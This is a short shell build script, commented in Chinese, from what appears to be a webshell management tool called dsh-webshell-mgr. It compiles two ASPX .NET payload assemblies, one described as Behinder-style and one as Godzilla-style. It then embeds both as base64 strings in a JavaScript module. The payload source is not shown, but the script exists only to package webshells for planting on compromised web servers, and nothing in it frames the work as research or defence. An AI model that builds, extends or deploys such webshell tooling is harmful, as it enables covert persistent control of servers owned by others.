#!/bin/sh
# 编译 ASPX 载荷（.NET 程序集）并重新生成 lib/protocol/payloads-aspx.js（嵌入 base64）。
# 用法：sh payload-src/build-aspx.sh   （需要 mono mcs；类名必须 U——原版冰蝎马 CreateInstance("U")）
set -e
cd "$(dirname "$0")"
OUT=../lib/protocol/payloads-aspx.js
ASM=../assets/payloads-aspx
mkdir -p "$ASM"
mcs -target:library -optimize -r:System.Web.dll -out:"$ASM/U.dll" csharp/U.cs
mcs -target:library -optimize -r:System.Web.dll -out:"$ASM/UG.dll" csharp/UG.cs
{
	printf '// dsh-webshell-mgr ASPX 载荷程序集（payload-src/build-aspx.sh 生成，勿手改）。\n'
	printf '// U = 冰蝎型（单程序集多操作， Equals(Page|handler) 入口；实参走 X-W-P 头）；\n'
	printf '// UG = 哥斯拉型会话态 dispatcher（equals 注入 byte[]/MemoryStream，toString 执行）。\n'
	printf 'export const ASPX_PAYLOADS = {\n'
	printf '\tU: "%s",\n' "$(base64 < "$ASM/U.dll" | tr -d '\n')"
	printf '\tUG: "%s",\n' "$(base64 < "$ASM/UG.dll" | tr -d '\n')"
	printf '};\n'
} > "$OUT"
echo "built: $OUT"
ls -la "$ASM"
